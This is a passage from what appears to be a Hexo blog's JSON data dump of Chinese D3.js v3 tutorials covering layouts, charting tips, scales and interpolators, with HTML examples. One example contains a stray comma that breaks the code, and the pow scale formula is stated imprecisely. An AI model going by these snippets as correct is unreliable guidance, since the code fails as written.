取得或设置饼布局填充角度\n* pie.sort 控制饼片段的顺时针方向的顺序\n* pie.startAngle 取得或设置饼布局整体的开始角度\n* pie.value 取得或设置值访问器函数\n* pie 计算饼图或圆环图中弧的开始和结束角度\n\n### 力布局 `d3.layout.force`\n* force.links() 取得或者设置节点间的链接数组\n* force.nodes() 取得或者设置布局的节点数组\n* force.size() 取得或者设置布局大小\n* force.linkDistance() 取得或者设置链接距离\n* force.charge() 取得或者设置电荷强度\n* force.on() 监听在计算布局位置时的更新\n    * start 力学图运动开始\n    * tick 力学图运动中\n    * end 力学图运动结束\n* force.drag() 给节点绑定拖动行为\n    * dragstart 单个节点拖拽开始\n    * drag 单个节点拖拽中\n    * dragend 单个节点拖拽结束\n* force.alpha() 取得或者设置力布局的冷却参数\n\n### 树布局 `d3.layout.tree`\n* `tree()` tree.nodes的别名\n* `tree.children()` 取得或设置孩子访问器\n* `tree.size()` 用x和y指定树的尺寸\n* `tree.nodes()` 计算父布局并返回一组节点\n* `tree.links()` 计算树节点的父-子连接\n* `tree.sort()` 控制遍历顺序中兄弟节点的顺序\n* `tree.nodeSize()` 为每个节点指定一个固定的尺寸\n* `tree.separation()` 取得或设置相邻节点的间隔函数\n","slug":"D3.js/布局","published":1,"updated":"2021-04-28T02:30:46.361Z","_id":"cko0u126r0005y26rgqlb1smt","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"布局\"><a href=\"#布局\" class=\"headerlink\" title=\"布局\"></a>布局</h1><h3 id=\"1、饼布局-d3-layout-pie\"><a href=\"#1、饼布局-d3-layout-pie\" class=\"headerlink\" title=\"1、饼布局 d3.layout.pie\"></a>1、饼布局 <code>d3.layout.pie</code></h3><ul>\n<li>pie.endAngl 取得或设置饼布局整体的结束角度</li>\n<li>pie.padAngle 取得或设置饼布局填充角度</li>\n<li>pie.sort 控制饼片段的顺时针方向的顺序</li>\n<li>pie.startAngle 取得或设置饼布局整体的开始角度</li>\n<li>pie.value 取得或设置值访问器函数</li>\n<li>pie 计算饼图或圆环图中弧的开始和结束角度</li>\n</ul>\n<h3 id=\"力布局-d3-layout-force\"><a href=\"#力布局-d3-layout-force\" class=\"headerlink\" title=\"力布局 d3.layout.force\"></a>力布局 <code>d3.layout.force</code></h3><ul>\n<li>force.links() 取得或者设置节点间的链接数组</li>\n<li>force.nodes() 取得或者设置布局的节点数组</li>\n<li>force.size() 取得或者设置布局大小</li>\n<li>force.linkDistance() 取得或者设置链接距离</li>\n<li>force.charge() 取得或者设置电荷强度</li>\n<li>force.on() 监听在计算布局位置时的更新<ul>\n<li>start 力学图运动开始</li>\n<li>tick 力学图运动中</li>\n<li>end 力学图运动结束</li>\n</ul>\n</li>\n<li>force.drag() 给节点绑定拖动行为<ul>\n<li>dragstart 单个节点拖拽开始</li>\n<li>drag 单个节点拖拽中</li>\n<li>dragend 单个节点拖拽结束</li>\n</ul>\n</li>\n<li>force.alpha() 取得或者设置力布局的冷却参数</li>\n</ul>\n<h3 id=\"树布局-d3-layout-tree\"><a href=\"#树布局-d3-layout-tree\" class=\"headerlink\" title=\"树布局 d3.layout.tree\"></a>树布局 <code>d3.layout.tree</code></h3><ul>\n<li><code>tree()</code> tree.nodes的别名</li>\n<li><code>tree.children()</code> 取得或设置孩子访问器</li>\n<li><code>tree.size()</code> 用x和y指定树的尺寸</li>\n<li><code>tree.nodes()</code> 计算父布局并返回一组节点</li>\n<li><code>tree.links()</code> 计算树节点的父-子连接</li>\n<li><code>tree.sort()</code> 控制遍历顺序中兄弟节点的顺序</li>\n<li><code>tree.nodeSize()</code> 为每个节点指定一个固定的尺寸</li>\n<li><code>tree.separation()</code> 取得或设置相邻节点的间隔函数</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"布局\"><a href=\"#布局\" class=\"headerlink\" title=\"布局\"></a>布局</h1><h3 id=\"1、饼布局-d3-layout-pie\"><a href=\"#1、饼布局-d3-layout-pie\" class=\"headerlink\" title=\"1、饼布局 d3.layout.pie\"></a>1、饼布局 <code>d3.layout.pie</code></h3><ul>\n<li>pie.endAngl 取得或设置饼布局整体的结束角度</li>\n<li>pie.padAngle 取得或设置饼布局填充角度</li>\n<li>pie.sort 控制饼片段的顺时针方向的顺序</li>\n<li>pie.startAngle 取得或设置饼布局整体的开始角度</li>\n<li>pie.value 取得或设置值访问器函数</li>\n<li>pie 计算饼图或圆环图中弧的开始和结束角度</li>\n</ul>\n<h3 id=\"力布局-d3-layout-force\"><a href=\"#力布局-d3-layout-force\" class=\"headerlink\" title=\"力布局 d3.layout.force\"></a>力布局 <code>d3.layout.force</code></h3><ul>\n<li>force.links() 取得或者设置节点间的链接数组</li>\n<li>force.nodes() 取得或者设置布局的节点数组</li>\n<li>force.size() 取得或者设置布局大小</li>\n<li>force.linkDistance() 取得或者设置链接距离</li>\n<li>force.charge() 取得或者设置电荷强度</li>\n<li>force.on() 监听在计算布局位置时的更新<ul>\n<li>start 力学图运动开始</li>\n<li>tick 力学图运动中</li>\n<li>end 力学图运动结束</li>\n</ul>\n</li>\n<li>force.drag() 给节点绑定拖动行为<ul>\n<li>dragstart 单个节点拖拽开始</li>\n<li>drag 单个节点拖拽中</li>\n<li>dragend 单个节点拖拽结束</li>\n</ul>\n</li>\n<li>force.alpha() 取得或者设置力布局的冷却参数</li>\n</ul>\n<h3 id=\"树布局-d3-layout-tree\"><a href=\"#树布局-d3-layout-tree\" class=\"headerlink\" title=\"树布局 d3.layout.tree\"></a>树布局 <code>d3.layout.tree</code></h3><ul>\n<li><code>tree()</code> tree.nodes的别名</li>\n<li><code>tree.children()</code> 取得或设置孩子访问器</li>\n<li><code>tree.size()</code> 用x和y指定树的尺寸</li>\n<li><code>tree.nodes()</code> 计算父布局并返回一组节点</li>\n<li><code>tree.links()</code> 计算树节点的父-子连接</li>\n<li><code>tree.sort()</code> 控制遍历顺序中兄弟节点的顺序</li>\n<li><code>tree.nodeSize()</code> 为每个节点指定一个固定的尺寸</li>\n<li><code>tree.separation()</code> 取得或设置相邻节点的间隔函数</li>\n</ul>\n"},{"title":"技巧","date":"2021-03-23T16:00:00.000Z","_content":"\n# 技巧\n\n\n* 画布区域要有留白 `padding = [20, 20, 30, 40]`\n* Y 轴方向的尺度需要做倒置处理，因为浏览器默认 SVG 的 Y 轴是从上至下，但按照图标惯例是从下至上，所以数据项的值越大时，对应的 Y 轴坐标应该越小。为了处理这些逆转，可以在定义范围时交换这些值，如 `d3.scale.linear().domain([0, maxVal]).range([height, 0])`\n* `<g>` 元素内的所有元素都是以父元素 `<g>` 为标准进行排版\n    * 图形区域用 `<g>` 元素包裹\n    * 坐标轴区域用 `<g>` 元素包裹\n    * 图例区域用 `<g>` 元素包裹\n    * ... \n* 对于图标中可能会重叠的项，可以添加透明度，增强层次感","source":"_posts/D3.js/技巧篇.md","raw":"---\ntitle: 技巧\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 技巧\n\n\n* 画布区域要有留白 `padding = [20, 20, 30, 40]`\n* Y 轴方向的尺度需要做倒置处理，因为浏览器默认 SVG 的 Y 轴是从上至下，但按照图标惯例是从下至上，所以数据项的值越大时，对应的 Y 轴坐标应该越小。为了处理这些逆转，可以在定义范围时交换这些值，如 `d3.scale.linear().domain([0, maxVal]).range([height, 0])`\n* `<g>` 元素内的所有元素都是以父元素 `<g>` 为标准进行排版\n    * 图形区域用 `<g>` 元素包裹\n    * 坐标轴区域用 `<g>` 元素包裹\n    * 图例区域用 `<g>` 元素包裹\n    * ... \n* 对于图标中可能会重叠的项，可以添加透明度，增强层次感","slug":"D3.js/技巧篇","published":1,"updated":"2021-04-28T02:31:12.302Z","_id":"cko0u126v0006y26rh569bcq9","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"技巧\"><a href=\"#技巧\" class=\"headerlink\" title=\"技巧\"></a>技巧</h1><ul>\n<li>画布区域要有留白 <code>padding = [20, 20, 30, 40]</code></li>\n<li>Y 轴方向的尺度需要做倒置处理，因为浏览器默认 SVG 的 Y 轴是从上至下，但按照图标惯例是从下至上，所以数据项的值越大时，对应的 Y 轴坐标应该越小。为了处理这些逆转，可以在定义范围时交换这些值，如 <code>d3.scale.linear().domain([0, maxVal]).range([height, 0])</code></li>\n<li><code>&lt;g&gt;</code> 元素内的所有元素都是以父元素 <code>&lt;g&gt;</code> 为标准进行排版<ul>\n<li>图形区域用 <code>&lt;g&gt;</code> 元素包裹</li>\n<li>坐标轴区域用 <code>&lt;g&gt;</code> 元素包裹</li>\n<li>图例区域用 <code>&lt;g&gt;</code> 元素包裹</li>\n<li>… </li>\n</ul>\n</li>\n<li>对于图标中可能会重叠的项，可以添加透明度，增强层次感</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧\"><a href=\"#技巧\" class=\"headerlink\" title=\"技巧\"></a>技巧</h1><ul>\n<li>画布区域要有留白 <code>padding = [20, 20, 30, 40]</code></li>\n<li>Y 轴方向的尺度需要做倒置处理，因为浏览器默认 SVG 的 Y 轴是从上至下，但按照图标惯例是从下至上，所以数据项的值越大时，对应的 Y 轴坐标应该越小。为了处理这些逆转，可以在定义范围时交换这些值，如 <code>d3.scale.linear().domain([0, maxVal]).range([height, 0])</code></li>\n<li><code>&lt;g&gt;</code> 元素内的所有元素都是以父元素 <code>&lt;g&gt;</code> 为标准进行排版<ul>\n<li>图形区域用 <code>&lt;g&gt;</code> 元素包裹</li>\n<li>坐标轴区域用 <code>&lt;g&gt;</code> 元素包裹</li>\n<li>图例区域用 <code>&lt;g&gt;</code> 元素包裹</li>\n<li>… </li>\n</ul>\n</li>\n<li>对于图标中可能会重叠的项，可以添加透明度，增强层次感</li>\n</ul>\n"},{"title":"比例尺","date":"2021-03-23T16:00:00.000Z","_content":"\n# 比例尺\n\n说明：任何数据集中的值都不太可能完全对应于可视化中使用的像素测量值。比例提供了一种方便的方法，将这些数据值映射为可用于可视化目的的新值。\n\n`d3.scale`\n\n> 数据集中的数据其实是通过映射成一个个坐标点后在页面中绘制出来的，而数据可能会很大或很小，所以需要将数值进行映射以适配 SVG 容器的大小\n\n* scale.copy: 创建比例尺的副本。\n* scale.interpolate: 取得或设置比例尺的输出插值器。\n* scale.invert: 取得给定输出值对应定义域中的值。\n* scale.nice: 扩展比例尺的定义域为一个优化的整数值。\n* scale.tickFormat: 取得用于展示刻度值的格式化器。\n* scale.ticks: 取得定义域中有代表性的值。\n\n### 插值器\n给定函数 `f(x)` 在 `x0, x1,...,xn` 处的值。现有 `x'`，其值在上述取值点间。那么，求 `f(x')`值的过程叫做 **插值**\n\n插值不仅在尺度功能的实现中非常重要，对于 D3 的其他核心功能的实现也不可或缺，例如，动画和布局管理功能。因而 D3 设计了一个独立、可重用的插值\n器，以便在实现其他功能时提供统一的调用方式。（默认的范围域是 `[0, 1]`）\n\n* d3.interpolate: 返回一个介于 a 和 b 之间的默认插值器(`a`、`b`可为对象，包含多个属性，使用复合尺度插值时，D3 会遍历对象中的所有成员，并对其每一个组成部分应用相应的简单插值规则)\n* d3.interpolateNumber: 插补两个数字值\n* d3.interpolateString: 插补两个字符串\n* d3.interpolateArray: 插补两个数组\n* d3.interpolateHcl: 插补两个 HCL 颜色值\n* d3.interpolateHsl: 插补两个 HSL 颜色值\n* d3.interpolateLab: 插补两个 `L * a * b *` 颜色值\n* d3.interpolateObject: 插补两个任意对象\n* d3.interpolateRgb: 插补两个RGB颜色值\n* d3.interpolateRound: 插补两个整数\n* d3.interpolateTransform: 插补两个 2D 矩阵变换\n* d3.interpolateZoom: 在两个点之间平滑地缩放平移\n\n```js\nvar interpolate = d3.interpolateNumber(0, 100);\ninterpolate(0.1);  // 10\ninterpolate(0.99); // 99\n\n// 使用 d3.interpolateNumber 函数创建了一个值域为 [0, 100] 的interpolate函数，并使用这个函数对指定的数字进行插值。该函数与如下代码是等价的。\n// function interpolate(t){\n//     return a * (1 - t) + b * t;\n// }\n\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 600;\n        let h = 400;\n        let start = {\n            'font-size': '12px',\n            color: '#f00'\n        };\n        let end = {\n            'font-size': '40px',\n            color: '#ff0'\n        };\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n            \n        let interpolate = d3.interpolate(start, end);\n        let groups = svg.append('g');\n\n        for (let i = 1; i < 10; i++) {\n            let info = interpolate(i / 10);\n            groups.append('text')\n                .text(i)\n                .attr('x', 0 + i * 24)\n                .attr('y', 40),\n                .attr('class', 'text-list')\n                .style('fill', info.color)\n                .style('font-size', info['font-size']);\n        }\n    </script>\n</body>\n\n</html>\n```\n\n## 类别\n* 数值尺度\n    * d3.scale.linear: 线性比例尺 （`f(n) = kx + b`）\n        * d3.time.scale: 线性时间比例尺\n    * d3.scale.pow: 指数比例尺 （`f(n) = a * n ^ 2 + b`）\n        * pow.exponent(k) 用于设置二项式系数 a 的值，默认为 1\n    * d3.scale.log: 对数比例尺（`f(n) = a * log(n) + b`）\n        * log.base(base) : 设置这个对数比例尺的底数，默认是 10\n    * d3.scale.quantize: 量化比例尺（定义域是连续的，值域是离散）\n    * d3.scale.identity: 线性恒等比例尺\n    * d3.scale.quantile: 分位数比例尺\n    * d3.scale.sqrt: 平方根比例尺\n    * d3.scale.threshold: 临界值比例尺（值域离散）\n* 有序尺度\n    * d3.scale.ordinal: 序数比例尺 （key、value 映射，无具体表达式）\n    * d3.scale.category10: 该比例尺中有默认的值域中有 10 种颜色\n    * d3.scale.category20: 该比例尺中有默认的值域中有 20 种颜色\n    * d3.scale.category20b: 该比例尺中有默认的值域中有 20 种颜色\n    * d3.scale.category20c: 该比例尺中有默认的值域中有 20 种颜色\n\n\n## 线性比例尺\n\n说明：将输入域映射到连续的输出范围，类似 `y=kx+b` 线性函数，如将身高映射成柱状图的高度（像素），`let linear = d3.scale.linear()`\n\n> * 线性比例尺的默认输入域 [0, 1]，默认输出范围为 [0, 1]，此时为恒等函数\n> * 比例尺只是定义了一个映射规则，映射的输入值并不局限于 `domain()` 中的输入域\n\n* `linear(x)`：在输入域中的输入 x，返回输出范围对应的值。\n* `linear.domain([min, max])`：指定输入域范围\n* `linear.range([min, max])`：指定输出范围\n* `linear.ticks()`：返回比例尺输入域的代表性时间\n\n## 时间比例尺\n\n说明：`d3.time.scale` 是 `d3.scale.linear` 比例尺的扩展，使用 Javascript 的 `Date` 对象作为其输入域 `domain`，`let time = d3.time.scale()` \n\n* `time`: 取得给定定义域中值对应的输出范围中的值。\n* `time.domain`: 取得或设置比例尺度的定义域。\n* `time.rangeRound`: 设置比例尺的四舍五入输出范围。\n* `time.range`：取得或设置比例尺的输出范围。\n\n\n## 序号比例尺\n\n说明：序号比例尺来映射输入域（离散）到输出范围。 `let ordinal = d3.scale.ordinal()`\n\n* `ordinal(x)`：在输入域中的输入 x，返回输出范围对应的值。\n* `ordinal.domain([a, b, ..., x])`：指定输入域范围（一系列离散的数据）\n* `ordinal.range([k1, k2, ..., kn])`：如果指定了输出范围，设置当前比例尺对象的输出范围为指定的 values 数组，如果 values 中的值的个数少于输入域中元素的个数，那么 values 中的值会被循环使用。（主要用于颜色）\n* `ordinal.rangePoints([min, max], padding)`：指定输出范围为一个连续的区间，第一个位置和最后一个位置会因为入参 padding 的值而做相应，消减长度是padding 个间隔长度的一半；默认情况下 padding 是 0 \n* `ordinal.rangeBands([min, max], padding, outerPadding)`：该函数是将区间切分成一个个小的区间段，而不是一个个刻度点（刻度在坐标轴中间，而不是在起点，适用于柱状图）\n* `rdinal.rangeRoundPoints([min, max], padding)`：功能同 `ordinal.rangePoints`，但是该函数可以美化输出的刻度点，即保证整数\n* `ordinal.rangeRoundBands([min, max], padding, outerPadding)` 功能同 `ordinal.rangeBands`，但是该函数可以美化输出的区间段，即保证每个区间段的起点值都是整数\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 800;\n        let h = 400;\n        let padding = 40;\n        let dateRange = [new Date(2017, 0, 1), new Date(2018, 2, 1)];\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let xScale = d3.time.scale()\n            .domain(dateRange)\n            .rangeRound([padding, w - padding]);\n\n        let axis = d3.svg.axis()\n            .scale(xScale)\n            .tickFormat(d3.time.format('%m-%d'));\n\n        svg.append('g')\n            .attr('class', 'x-axis')\n            .call(axis);\n    </script>\n</body>\n\n</html>\n```","source":"_posts/D3.js/比例尺.md","raw":"---\ntitle: 比例尺\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 比例尺\n\n说明：任何数据集中的值都不太可能完全对应于可视化中使用的像素测量值。比例提供了一种方便的方法，将这些数据值映射为可用于可视化目的的新值。\n\n`d3.scale`\n\n> 数据集中的数据其实是通过映射成一个个坐标点后在页面中绘制出来的，而数据可能会很大或很小，所以需要将数值进行映射以适配 SVG 容器的大小\n\n* scale.copy: 创建比例尺的副本。\n* scale.interpolate: 取得或设置比例尺的输出插值器。\n* scale.invert: 取得给定输出值对应定义域中的值。\n* scale.nice: 扩展比例尺的定义域为一个优化的整数值。\n* scale.tickFormat: 取得用于展示刻度值的格式化器。\n* scale.ticks: 取得定义域中有代表性的值。\n\n### 插值器\n给定函数 `f(x)` 在 `x0, x1,...,xn` 处的值。现有 `x'`，其值在上述取值点间。那么，求 `f(x')`值的过程叫做 **插值**\n\n插值不仅在尺度功能的实现中非常重要，对于 D3 的其他核心功能的实现也不可或缺，例如，动画和布局管理功能。因而 D3 设计了一个独立、可重用的插值\n器，以便在实现其他功能时提供统一的调用方式。（默认的范围域是 `[0, 1]`）\n\n* d3.interpolate: 返回一个介于 a 和 b 之间的默认插值器(`a`、`b`可为对象，包含多个属性，使用复合尺度插值时，D3 会遍历对象中的所有成员，并对其每一个组成部分应用相应的简单插值规则)\n* d3.interpolateNumber: 插补两个数字值\n* d3.interpolateString: 插补两个字符串\n* d3.interpolateArray: 插补两个数组\n* d3.interpolateHcl: 插补两个 HCL 颜色值\n* d3.interpolateHsl: 插补两个 HSL 颜色值\n* d3.interpolateLab: 插补两个 `L * a * b *` 颜色值\n* d3.interpolateObject: 插补两个任意对象\n* d3.interpolateRgb: 插补两个RGB颜色值\n* d3.interpolateRound: 插补两个整数\n* d3.interpolateTransform: 插补两个 2D 矩阵变换\n* d3.interpolateZoom: 在两个点之间平滑地缩放平移\n\n```js\nvar interpolate = d3.interpolateNumber(0, 100);\ninterpolate(0.1);  // 10\ninterpolate(0.99); // 99\n\n// 使用 d3.interpolateNumber 函数创建了一个值域为 [0, 100] 的interpolate函数，并使用这个函数对指定的数字进行插值。该函数与如下代码是等价的。\n// function interpolate(t){\n//     return a * (1 - t) + b * t;\n// }\n\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 600;\n        let h = 400;\n        let start = {\n            'font-size': '12px',\n            color: '#f00'\n        };\n        let end = {\n            'font-size': '40px',\n            color: '#ff0'\n        };\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n            \n        let interpolate = d3.interpolate(start, end);\n        let groups = svg.append('g');\n\n        for (let i = 1; i < 10; i++) {\n            let info = interpolate(i / 10);\n            groups.append('text')\n                .text(i)\n                .attr('x', 0 + i * 24)\n                .attr('y', 40),\n                .attr('class', 'text-list')\n                .style('fill', info.color)\n                .style('font-size', info['font-size']);\n        }\n    </script>\n</body>\n\n</html>\n```\n\n## 类别\n* 数值尺度\n    * d3.scale.linear: 线性比例尺 （`f(n) = kx + b`）\n        * d3.time.scale: 线性时间比例尺\n    * d3.scale.pow: 指数比例尺 （`f(n) = a * n ^ 2 + b`）\n        * pow.exponent(k) 用于设置二项式系数 a 的值，默认为 1\n    * d3.scale.log: 对数比例尺（`f(n) = a * log(n) + b`）\n        * log.base(base) : 设置这个对数比例尺的底数，默认是 10\n    * d3.scale.quantize: 量化比例尺（定义域是连续的，值域是离散）\n    * d3.scale.identity: 线性恒等比例尺\n    * d3.scale.quantile: 分位数比例尺\n    * d3.scale.sqrt: 平方根比例尺\n    * d3.scale.threshold: 临界值比例尺（值域离散）\n* 有序尺度\n    * d3.scale.ordinal: 序数比例尺 （key、value 映射，无具体表达式）\n    * d3.scale.category10: 该比例尺中有默认的值域中有 10 种颜色\n    * d3.scale.category20: 该比例尺中有默认的值域中有 20 种颜色\n    * d3.scale.category20b: 该比例尺中有默认的值域中有 20 种颜色\n    * d3.scale.category20c: 该比例尺中有默认的值域中有 20 种颜色\n\n\n## 线性比例尺\n\n说明：将输入域映射到连续的输出范围，类似 `y=kx+b` 线性函数，如将身高映射成柱状图的高度（像素），`let linear = d3.scale.linear()`\n\n> * 线性比例尺的默认输入域 [0, 1]，默认输出范围为 [0, 1]，此时为恒等函数\n> * 比例尺只是定义了一个映射规则，映射的输入值并不局限于 `domain()` 中的输入域\n\n* `linear(x)`：在输入域中的输入 x，返回输出范围对应的值。\n* `linear.domain([min, max])`：指定输入域范围\n* `linear.range([min, max])`：指定输出范围\n* `linear.ticks()`：返回比例尺输入域的代表性时间\n\n## 时间比例尺\n\n说明：`d3.time.scale` 是 `d3.scale.linear` 比例尺的扩展，使用 Javascript 的 `Date` 对象作为其输入域 `domain`，`let time = d3.time.scale()` \n\n* `time`: 取得给定定义域中值对应的输出范围中的值。\n* `time.domain`: 取得或设置比例尺度的定义域。\n* `time.rangeRound`: 设置比例尺的四舍五入输出范围。\n* `time.range`：取得或设置比例尺的输出范围。\n\n\n## 序号比例尺\n\n说明：序号比例尺来映射输入域（离散）到输出范围。 `let ordinal = d3.scale.ordinal()`\n\n* `ordinal(x)`：在输入域中的输入 x，返回输出范围对应的值。\n* `ordinal.domain([a, b, ..., x])`：指定输入域范围（一系列离散的数据）\n* `ordinal.range([k1, k2, ..., kn])`：如果指定了输出范围，设置当前比例尺对象的输出范围为指定的 values 数组，如果 values 中的值的个数少于输入域中元素的个数，那么 values 中的值会被循环使用。（主要用于颜色）\n* `ordinal.rangePoints([min, max], padding)`：指定输出范围为一个连续的区间，第一个位置和最后一个位置会因为入参 padding 的值而做相应，消减长度是padding 个间隔长度的一半；默认情况下 padding 是 0 \n* `ordinal.rangeBands([min, max], padding, outerPadding)`：该函数是将区间切分成一个个小的区间段，而不是一个个刻度点（刻度在坐标轴中间，而不是在起点，适用于柱状图）\n* `rdinal.rangeRoundPoints([min, max], padding)`：功能同 `ordinal.rangePoints`，但是该函数可以美化输出的刻度点，即保证整数\n* `ordinal.rangeRoundBands([min, max], padding, outerPadding)` 功能同 `ordinal.rangeBands`，但是该函数可以美化输出的区间段，即保证每个区间段的起点值都是整数\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 800;\n        let h = 400;\n        let padding = 40;\n        let dateRange = [new Date(2017, 0, 1), new Date(2018, 2, 1)];\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let xScale = d3.time.scale()\n            .domain(dateRange)\n            .rangeRound([padding, w - padding]);\n\n        let axis = d3.svg.axis()\n            .scale(xScale)\n            .tickFormat(d3.time.format('%m-%d'));\n\n        svg.append('g')\n            .attr('class', 'x-axis')\n            .call(axis);\n    </script>\n</body>\n\n</html>\n```","slug":"D3.js/比例尺","published":1,"updated":"2021-04-28T02:29:34.781Z","_id":"cko0u126x0007y26rd2ureszb","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"比例尺\"><a href=\"#比例尺\" class=\"headerlink\" title=\"比例尺\"></a>比例尺</h1><p>说明：任何数据集中的值都不太可能完全对应于可视化中使用的像素测量值。比例提供了一种方便的方法，将这些数据值映射为可用于可视化目的的新值。</p>\n<p><code>d3.scale</code></p>\n<blockquote>\n<p>数据集中的数据其实是通过映射成一个个坐标点后在页面中绘制出来的，而数据可能会很大或很小，所以需要将数值进行映射以适配 SVG 容器的大小</p>\n</blockquote>\n<ul>\n<li>scale.copy: 创建比例尺的副本。</li>\n<li>scale.interpolate: 取得或设置比例尺的输出插值器。</li>\n<li>scale.invert: 取得给定输出值对应定义域中的值。</li>\n<li>scale.nice: 扩展比例尺的定义域为一个优化的整数值。</li>\n<li>scale.tickFormat: 取得用于展示刻度值的格式化器。</li>\n<li>scale.ticks: 取得定义域中有代表性的值。</li>\n</ul>\n<h3 id=\"插值器\"><a href=\"#插值器\" class=\"headerlink\" title=\"插值器\"></a>插值器</h3><p>给定函数 <code>f(x)</code> 在 <code>x0, x1,...,xn</code> 处的值。现有 <code>x&#39;</code>，其值在上述取值点间。那么，求 <code>f(x&#39;)</code>值的过程叫做 <strong>插值</strong></p>\n<p>插值不仅在尺度功能的实现中非常重要，对于 D3 的其他核心功能的实现也不可或缺，例如，动画和布局管理功能。因而 D3 设计了一个独立、可重用的插值<br>器，以便在实现其他功能时提供统一的调用方式。（默认的范围域是 <code>[0, 1]</code>）</p>\n<ul>\n<li>d3.interpolate: 返回一个介于 a 和 b 之间的默认插值器(<code>a</code>、<code>b</code>可为对象，包含多个属性，使用复合尺度插值时，D3 会遍历对象中的所有成员，并对其每一个组成部分应用相应的简单插值规则)</li>\n<li>d3.interpolateNumber: 插补两个数字值</li>\n<li>d3.interpolateString: 插补两个字符串</li>\n<li>d3.interpolateArray: 插补两个数组</li>\n<li>d3.interpolateHcl: 插补两个 HCL 颜色值</li>\n<li>d3.interpolateHsl: 插补两个 HSL 颜色值</li>\n<li>d3.interpolateLab: 插补两个 <code>L * a * b *</code> 颜色值</li>\n<li>d3.interpolateObject: 插补两个任意对象</li>\n<li>d3.interpolateRgb: 插补两个RGB颜色值</li>\n<li>d3.interpolateRound: 插补两个整数</li>\n<li>d3.interpolateTransform: 插补两个 2D 矩阵变换</li>\n<li>d3.interpolateZoom: 在两个点之间平滑地缩放平移</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> interpolate = d3.interpolateNumber(<span class=\"number\">0</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">interpolate(<span class=\"number\">0.1</span>);  <span class=\"comment\">// 10</span></span><br><span class=\"line\">interpolate(<span class=\"number\">0.99</span>); <span class=\"comment\">// 99</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 d3.interpolateNumber 函数创建了一个值域为 [0, 100] 的interpolate函数，并使用这个函数对指定的数字进行插值。该函数与如下代码是等价的。</span></span><br><span class=\"line\"><span class=\"comment\">// function interpolate(t)&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     return a * (1 - t) + b * t;</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span 